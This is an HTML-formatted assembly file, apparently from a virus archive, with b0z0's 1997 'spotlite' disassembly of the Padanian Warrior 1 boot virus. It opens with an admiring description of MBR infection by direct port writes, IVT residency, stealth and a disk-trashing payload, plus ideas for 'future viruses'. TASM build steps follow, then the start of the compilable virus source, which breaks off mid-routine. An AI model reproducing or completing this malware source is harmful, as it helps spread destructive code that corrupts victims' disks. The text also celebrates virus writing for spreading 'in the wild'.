<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Boot.IntCE - pdnwar.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; comment *</span><span class="sc0">
</span><span class="sc1">;                      Virus spotlite:  Padanian Warrior 1</span><span class="sc0">
</span><span class="sc1">;                            by b0z0/iKx, Padania 1997</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Virus Name      : Padanian Warrior 1</span><span class="sc0">
</span><span class="sc1">; AV Name         : IntCE (AVP), Int_CE (F-Prot)</span><span class="sc0">
</span><span class="sc1">; Origin          : Padania</span><span class="sc0">
</span><span class="sc1">; Type            : Boot infector</span><span class="sc0">
</span><span class="sc1">; Lenght          : one sector</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Virus Description:</span><span class="sc0">
</span><span class="sc1">; ออออออออออออออออออ</span><span class="sc0">
</span><span class="sc1">;  This is a very cool boot virus that infects the MBR of the hard disk</span><span class="sc0">
</span><span class="sc1">; and infects any floppy disk that is accessed via DOS. This boot virus is</span><span class="sc0">
</span><span class="sc1">; extremely compact and implements a lot of interesting methods and tricks.</span><span class="sc0">
</span><span class="sc1">; The Padanian Warrior 1 in fact:</span><span class="sc0">
</span><span class="sc1">;         -&gt; Doesn't allocate memory</span><span class="sc0">
</span><span class="sc1">;         -&gt; Infects the MBR using ports</span><span class="sc0">
</span><span class="sc1">;         -&gt; Makes booting from a floppy quite hard</span><span class="sc0">
</span><span class="sc1">;         -&gt; Uses the 18_tech</span><span class="sc0">
</span><span class="sc1">;         -&gt; Uses 386 instructions</span><span class="sc0">
</span><span class="sc1">;         -&gt; Full stealth on MBR</span><span class="sc0">
</span><span class="sc1">;         -&gt; Read stealth on floppy boot</span><span class="sc0">
</span><span class="sc1">;         -&gt; Has a very cool method to activate the payload</span><span class="sc0">
</span><span class="sc1">;         -&gt; Has a destructive payload</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Of course as you may suppose due to space restriction (hey, don't say "I may</span><span class="sc0">
</span><span class="sc1">; do that 25 bytes shorter" :) ) there are also some bad things in this virus,</span><span class="sc0">
</span><span class="sc1">; but these will be shown later.</span><span class="sc0">
</span><span class="sc1">;  Now let's examine deeper every aspect of this cool virus...</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Virus residency:</span><span class="sc0">
</span><span class="sc1">; ออออออออออออออออ</span><span class="sc0">
</span><span class="sc1">;  The virus uses a quite good way of going resident and doing his work. In fact</span><span class="sc0">
</span><span class="sc1">; the virus won't allocate as usually some memory but will rather copy itself</span><span class="sc0">
</span><span class="sc1">; into an unused part of the Interrupt Vector Table. Since 200h bytes may be too</span><span class="sc0">
</span><span class="sc1">; much and may cause some problems with the interrupts (since you may have to</span><span class="sc0">
</span><span class="sc1">; find a place with 80h unused ints) the virus will use just a little</span><span class="sc0">
</span><span class="sc1">; (3Ch bytes) part of the IVT. Here the virus will copy just the vital part of</span><span class="sc0">
</span><span class="sc1">; itself (this is the interrupt handler) that will provide when necessary to</span><span class="sc0">
</span><span class="sc1">; load the rest of the virus body.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  The virus will be copied always from 0:300 up to 0:33Ch. Another good trick</span><span class="sc0">
</span><span class="sc1">; that the virus uses is to use a piece of the copied part to call the original</span><span class="sc0">
</span><span class="sc1">; interrupt vector. In fact the virus will store the old interrupt vector in the</span><span class="sc0">
</span><span class="sc1">; dword at 0:338h. This of course will be used to chain the call to the original</span><span class="sc0">
</span><span class="sc1">; interrupt handler (doing a jmp far). But on the other side the dword at 0:338h</span><span class="sc0">
</span><span class="sc1">; is also the dword for the seg:off of the interrupt number 0CEh. So the virus</span><span class="sc0">
</span><span class="sc1">; instead of doing some space-consuming calls or something will just call the</span><span class="sc0">
</span><span class="sc1">; interrupt 0CEh when it will need to do a call to the original Int13h (AV</span><span class="sc0">
</span><span class="sc1">; name came just from this use of the 0CEh interrupt).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  As already mentioned the virus uses the 18_tech (look in Xine #2 for more</span><span class="sc0">
</span><span class="sc1">; explanations about this), so it won't issue any problem using windows and</span><span class="sc0">
</span><span class="sc1">; will be less AV-noticeable.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Padanian Warrior interrupt handler:</span><span class="sc0">
</span><span class="sc1">; อออออออออออออออออออออออออออออออออออ</span><span class="sc0">
</span><span class="sc1">;  Since it uses 18_tech at first it needs to correct in some way the stack.</span><span class="sc0">
</span><span class="sc1">; Of course the VW decided to do the work simply with an add (instead of popping</span><span class="sc0">
</span><span class="sc1">; like a good school boy :) ) and this is also a good antitrace.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  The handler will check for reads or writes on the first sector of disks and</span><span class="sc0">
</span><span class="sc1">; floppyes. When one interesting call is encountered the virus will save 400h</span><span class="sc0">
</span><span class="sc1">; bytes from the user's buffer (this is from ES:BX) to a buffer on the hard</span><span class="sc0">
</span><span class="sc1">; disk (two sectors after the virus body on the disk). Then the virus will load</span><span class="sc0">
</span><span class="sc1">; its entire body in the user's buffer from the hard disk and will jump (push</span><span class="sc0">
</span><span class="sc1">; seg:off and do a retf) to the just readed infection/stealth part.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  If the user requested a write on the MBR the virus will just change the</span><span class="sc0">
</span><span class="sc1">; call to a disk reset, if a read on the MBR occours the virus will return</span><span class="sc0">
</span><span class="sc1">; the original MBR, if a write on a floppy occours the virus will just leave it</span><span class="sc0">
</span><span class="sc1">; to proceed and finally if a read on the floppy is requested the virus will</span><span class="sc0">
</span><span class="sc1">; infect it and then will stealth the read returning a normal DOS boot.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Of course the data that is returned for the stealth is written on the</span><span class="sc0">
</span><span class="sc1">; previsiously mentioned hard disk buffer. Infact at the end of the work the</span><span class="sc0">
</span><span class="sc1">; virus will jump back to the virus body permanently in memory and will just</span><span class="sc0">
</span><span class="sc1">; reread to ES:BX the hard disk buffer (that may have been changed also by the</span><span class="sc0">
</span><span class="sc1">; stealth routines).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; MBR infection and new MBR manipulation:</span><span class="sc0">
</span><span class="sc1">; อออออออออออออออออออออออออออออออออออออออ</span><span class="sc0">
</span><span class="sc1">;  The MBR infection is done at the boot from an infected floppy disk. To</span><span class="sc0">
</span><span class="sc1">; determinate if the virus is already present on the hard disk it will check</span><span class="sc0">
</span><span class="sc1">; if the first partition starts at sector 1 (very common). If it starts</span><span class="sc0">
</span><span class="sc1">; somewhere else (because it is already infected or for some other user's</span><span class="sc0">
</span><span class="sc1">; reason) the virus quits the MBR infection routine.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  First of all the virus will save itself and the original MBR on two sectors</span><span class="sc0">
</span><span class="sc1">; starting from 0,0,5 (cyl,side,sector) on the hd. Then it will change the</span><span class="sc0">
</span><span class="sc1">; partition table of the 'new' MBR in this way:</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;                         ึฤฤฤฤาฤฤฤฤฤฤาฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤท</span><span class="sc0">
</span><span class="sc1">;                         บ N. บ TYPE บ  Partition start บ</span><span class="sc0">
</span><span class="sc1">;                         บ    บ      บ   C  /  H  /  S  บ</span><span class="sc0">
</span><span class="sc1">;                         วฤฤฤฤืฤฤฤฤฤฤืฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤถ</span><span class="sc0">
</span><span class="sc1">;                         บ 1  บ orig บ   0  /  0  /  5  บ</span><span class="sc0">
</span><span class="sc1">;                         บ 2  บ ext. บ   0  /  0  /  4  บ</span><span class="sc0">
</span><span class="sc1">;                         ำฤฤฤฤะฤฤฤฤฤฤะฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฤฝ</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  So the first entry (the orig in type means that it will just leave the same</span><span class="sc0">
</span><span class="sc1">; as it was before) will point to the virus body on the disk (so it will be</span><span class="sc0">
</span><span class="sc1">; loaded at each boot from that hard disk). The second partition will point to</span><span class="sc0">
</span><span class="sc1">; another modified MBR copy that the virus will put on the disk. In this second</span><span class="sc0">
</span><span class="sc1">; modified MBR (at 0,0,4) the virus will just leave one extended partition that</span><span class="sc0">
</span><span class="sc1">; will point to the same sector (this is to again to 0,0,4).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  So if the user will try to do a boot from a clean floppy disk DOS will go</span><span class="sc0">
</span><span class="sc1">; in an infinite loop looking for some other extended partition :) Of course</span><span class="sc0">
</span><span class="sc1">; if the virus is active the MBR stealth provides to give the saved good MBR</span><span class="sc0">
</span><span class="sc1">; when needed. Just some specific versions of DOS are able to boot from an</span><span class="sc0">
</span><span class="sc1">; infected PC.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  To avoid some BIOS virus protections the virus uses ports to write to the</span><span class="sc0">
</span><span class="sc1">; MBR. The routine to do this is incredibly short and efficent. It consist of</span><span class="sc0">
</span><span class="sc1">; a first part where the virus initializes the controller to the write (this</span><span class="sc0">
</span><span class="sc1">; is just a loop using a table for the initialization sequence) and then after</span><span class="sc0">
</span><span class="sc1">; a pause it will send the 200h bytes that must be written.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Floppy infection and stealth:</span><span class="sc0">
</span><span class="sc1">; อออออออออออออออออออออออออออออ</span><span class="sc0">
</span><span class="sc1">;  The virus won't save the original boot but it will just overwrite the</span><span class="sc0">
</span><span class="sc1">; original one with the virus body. It will preserve just the original serial</span><span class="sc0">
</span><span class="sc1">; number of the floppy. It won't even copy the BPB, but will just use the</span><span class="sc0">
</span><span class="sc1">; one from the first generation (that moved around with the virus :) ) that is</span><span class="sc0">
</span><span class="sc1">; part of the virus body. To see if the floppy is infected it will check the</span><span class="sc0">
</span><span class="sc1">; payload word (this is at 20h of the boot sector). If this is different than</span><span class="sc0">
</span><span class="sc1">; zero (set at formattation) then probably is already infected.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  As for stealth the virus will just give to the user a copy of the sector</span><span class="sc0">
</span><span class="sc1">; from the hard disk from 0,1,1 after coping the original BPB from the floppy</span><span class="sc0">
</span><span class="sc1">; disk to the right place. This stealth method counts on the fact that usually</span><span class="sc0">
</span><span class="sc1">; DOS is installed at 0,1,1 so there may be a good DOS boot sector to be used</span><span class="sc0">
</span><span class="sc1">; for stealth.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Payload activation:</span><span class="sc0">
</span><span class="sc1">; อออออออออออออออออออ</span><span class="sc0">
</span><span class="sc1">;  Also the payload activation is intelligent (even if, in my opinion, the</span><span class="sc0">
</span><span class="sc1">; payload isn't). At every boot from the MBR the virus will decrement a payload</span><span class="sc0">
</span><span class="sc1">; counter by one (at virus installation this will be initialized to 78h) and</span><span class="sc0">
</span><span class="sc1">; when it will come to zero the payload will be activated. The real cool thing</span><span class="sc0">
</span><span class="sc1">; is that on every succesfull floppy disk infection the payload counter will be</span><span class="sc0">
</span><span class="sc1">; incremented by two, so on machines with a good traffic of floppyes (hehe, a</span><span class="sc0">
</span><span class="sc1">; good virus distro :) ) the payload may never activate. On the other side on</span><span class="sc0">
</span><span class="sc1">; closed machines that don't spread the virus the payload may activate faster.</span><span class="sc0">
</span><span class="sc1">; This is a good idea, since it may not be a good thing to activate the payload</span><span class="sc0">
</span><span class="sc1">; (and make anyone to understand that a virus is around by trashing all the</span><span class="sc0">
</span><span class="sc1">; data on the hard disk) on a PC where a lot of floppyes are moving everyday</span><span class="sc0">
</span><span class="sc1">; (for example in a PC shop, in a school or in an office), while an isolated</span><span class="sc0">
</span><span class="sc1">; machine that doesn't give any profit to the virus may be attacked.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  The payload is rather dummy: it will just go in an infinite loop where</span><span class="sc0">
</span><span class="sc1">; ranomly selected sectors (4 at once) are overwritten by some random data.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Other goodies:</span><span class="sc0">
</span><span class="sc1">; ออออออออออออออ</span><span class="sc0">
</span><span class="sc1">;  As for other goodies I may mention that the virus uses also some 386</span><span class="sc0">
</span><span class="sc1">; instructions to make the code shorter and more efficent.</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  The real virus name is "encrypted" at the end of the virus. To get the name</span><span class="sc0">
</span><span class="sc1">; you must UUENCODE the boot sector and you will see the name 8)))))</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Bad virus aspects:</span><span class="sc0">
</span><span class="sc1">; ออออออออออออออออออ</span><span class="sc0">
</span><span class="sc1">;  The virus has also some bad aspects. These aren't bugs or something like, but</span><span class="sc0">
</span><span class="sc1">; are things decided to make the code shorter. Padanian Warrior 1 infact relays</span><span class="sc0">
</span><span class="sc1">; to be on a system of a "normal" (say tipical if you want :) ) user. Infact for</span><span class="sc0">
</span><span class="sc1">; example it relays on the fact that a DOS partition is set on 0,1,1 , that all</span><span class="sc0">
</span><span class="sc1">; the diskettes (or quite all) have the same 1.44Mb format and that no other</span><span class="sc0">
</span><span class="sc1">; operating systems are used (since it doesn't save the original boot sector).</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  But of course notice that IT FITS IN 448 bytes! So we can't pretend that it</span><span class="sc0">
</span><span class="sc1">; will make check of every possible O.S. or PC :) This "Bad virus aspects"</span><span class="sc0">
</span><span class="sc1">; section is only to give some ideas for future implementations and future</span><span class="sc0">
</span><span class="sc1">; viruses, not to say that the virus is bad! The virus relays on many settings</span><span class="sc0">
</span><span class="sc1">; and parameters from "normal" users, which are the real target of the virus</span><span class="sc0">
</span><span class="sc1">; (real users anyway aren't so lame to get infected... and don't use d0$ ;)) )</span><span class="sc0">
</span><span class="sc1">; and this is normal, since to make all the possible checks the virus may have</span><span class="sc0">
</span><span class="sc1">; to use the entire floppy :) So, in my personal opinion, the Padanian Warrior 1</span><span class="sc0">
</span><span class="sc1">; is effectively aimed to infect "normal" users and with those users it will</span><span class="sc0">
</span><span class="sc1">; work really very fine, so I suppose it may have a good chance to stay in</span><span class="sc0">
</span><span class="sc1">; the wild!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Description conclusion:</span><span class="sc0">
</span><span class="sc1">; อออออออออออออออออออออออ</span><span class="sc0">
</span><span class="sc1">;  This is undoubtely a VERY good boot virus. It has a lot of cool things and</span><span class="sc0">
</span><span class="sc1">; techs and all of this in just a sector. Expecially the port writing routine</span><span class="sc0">
</span><span class="sc1">; is great for its size and the payload activation method is undoubtely very</span><span class="sc0">
</span><span class="sc1">; interesting and may be interesting for payload activation for other viruses.</span><span class="sc0">
</span><span class="sc1">;  Well, I think that you may find many interesting tricks and implementations</span><span class="sc0">
</span><span class="sc1">; that may give your next boot virus a better look :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">;  Greetings to the author of the Padanian Warrior 1! Hey, we all are already</span><span class="sc0">
</span><span class="sc1">; waiting for the second one 8))</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Virus disasm:</span><span class="sc0">
</span><span class="sc1">; อออออออออออออ</span><span class="sc0">
</span><span class="sc1">; And here finally we come to the virus disasm, enjoy!</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; To compile, use TASM 3.0 (at least to get the real first generation):</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; tasm /l /zi /m2 pdnwar.asm</span><span class="sc0">
</span><span class="sc1">; tlink /m /v pdnwar.obj</span><span class="sc0">
</span><span class="sc1">; tdstrip -c pdnwar.exe</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; the resulting 512 bytes file must be put on a floppy boot sector...</span><span class="sc0">
</span><span class="sc1">; *</span><span class="sc0">

</span><span class="sc9">.model</span><span class="sc0"> </span><span class="sc10">tiny</span><span class="sc0">
</span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc2">.386</span><span class="sc0">

</span><span class="sc1">; Some macros, so the source will be more clear and readable :)</span><span class="sc0">

</span><span class="sc1">; This second macro is to prevent TASM to optimize in his way the LEA</span><span class="sc0">
</span><span class="sc1">; generation... since we want the same code as in the original virus :)</span><span class="sc0">
</span><span class="sc5">lea_ok</span><span class="sc0">          </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">fromreg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">segment</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Imm16</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">refreg</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">08dh</span><span class="sc0">
                </span><span class="sc9">ifidn</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">fromreg</span><span class="sc4">&gt;,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc8">di</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bfh</span><span class="sc0">
                </span><span class="sc9">endif</span><span class="sc0">
                </span><span class="sc9">ifidn</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">fromreg</span><span class="sc4">&gt;,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc8">DI</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0bfh</span><span class="sc0">
                </span><span class="sc9">endif</span><span class="sc0">
                </span><span class="sc9">ifidn</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">fromreg</span><span class="sc4">&gt;,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc8">si</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b7h</span><span class="sc0">
                </span><span class="sc9">endif</span><span class="sc0">
                </span><span class="sc9">ifidn</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc5">fromreg</span><span class="sc4">&gt;,</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc8">SI</span><span class="sc4">&gt;</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0b7h</span><span class="sc0">
                </span><span class="sc9">endif</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc5">Imm16</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">; This last macro is to prevent again a TASM optimization of add to a</span><span class="sc0">
</span><span class="sc1">; word in memory...</span><span class="sc0">
</span><span class="sc5">add_l</span><span class="sc0">           </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">weird</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pitr</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">refreg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">drek</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">add_value</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">83h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">87h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc5">add_value</span><span class="sc0">
</span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">; End of macros... finally the real virus code! :-)</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">

                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc0">       </span><span class="sc1">; Jump to virus body</span><span class="sc0">
                </span><span class="sc6">nop</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Here is placed the floppy data that will _always_ go around with the virus!</span><span class="sc0">
</span><span class="sc1">; This DBs are the first generation ones.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04dh</span><span class="sc4">,</span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc2">044h</span><span class="sc4">,</span><span class="sc2">04fh</span><span class="sc4">,</span><span class="sc2">053h</span><span class="sc4">,</span><span class="sc2">035h</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc4">,</span><span class="sc2">0e0h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">00bh</span><span class="sc4">,</span><span class="sc2">0f0h</span><span class="sc4">,</span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">012h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">002h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">078h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">029h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">009h</span><span class="sc4">,</span><span class="sc2">042h</span><span class="sc4">,</span><span class="sc2">026h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">04eh</span><span class="sc4">,</span><span class="sc2">04fh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">04eh</span><span class="sc4">,</span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc2">04dh</span><span class="sc4">,</span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">041h</span><span class="sc4">,</span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc2">032h</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">3eh</span><span class="sc0">

</span><span class="sc5">virus_start</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">                </span><span class="sc1">; Set SS:SP to 0:7C00h</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">                      </span><span class="sc1">; CS = DS = ES = SS</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int18_handler</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">7c00h</span><span class="sc4">)</span><span class="sc0">
                                                </span><span class="sc1">; copy a part of virus body</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">300h</span><span class="sc0">                 </span><span class="sc1">; in a piece of the IVT</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">orig_int13</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">int18_handler</span><span class="sc4">)</span><span class="sc0">
                </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc0">                  </span><span class="sc1">; SI on orig int13h</span><span class="sc0">
                </span><span class="sc6">movsd</span><span class="sc0">                           </span><span class="sc1">; save Seg:Off of int13h</span><span class="sc0">
                                                </span><span class="sc1">; at the end of our piece</span><span class="sc0">
                                                </span><span class="sc1">; of body (exactly at the</span><span class="sc0">
                                                </span><span class="sc1">; place for int CEh)</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; save ES for later</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0f000h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; point ES to ROM</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">

</span><span class="sc5">look_for_cd18</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">; 18_tech routine</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc2">18cdh</span><span class="sc0">  </span><span class="sc1">; search the int 18h in ROM</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">look_for_cd18</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">04ch</span><span class="sc0">                 </span><span class="sc1">; set the int 13h to point</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc8">bx</span><span class="sc0">        </span><span class="sc1">; to the CD18</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">es</span><span class="sc0">

